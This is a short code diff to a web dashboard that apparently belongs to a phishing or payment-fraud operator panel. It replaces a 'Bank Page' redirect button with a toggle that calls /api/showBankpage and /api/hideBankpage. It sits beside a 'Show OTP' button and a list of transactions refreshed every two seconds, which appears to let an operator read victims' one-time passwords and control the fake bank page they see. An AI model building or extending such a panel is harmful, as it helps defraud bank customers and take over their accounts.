@@ -307,9 +307,9 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
                   </button>
-                  <button class="bank-page-btn" onclick="redirectToBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                    Bank Page
-                  </button>`
+                 <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+  ${tx.bankpageVisible ? 'Hide Bankpage' : 'Bank Page'}
+</button>
               }
             </td>
             <td>
@@ -334,7 +334,24 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         console.error('Error loading transactions:', error);
       }
     }
-
+async function toggleBankpage(id) {
+  const txn = transactions.get(id);
+  const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
+  
+  try {
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ invoiceId: id })
+    });
+    
+    if (!response.ok) throw new Error('Operation failed');
+    loadTransactions();
+  } catch (error) {
+    console.error('Error:', error);
+    alert('Operation failed: ' + error.message);
+  }
+}
     loadTransactions();
     setInterval(loadTransactions, 2000);
   </script>
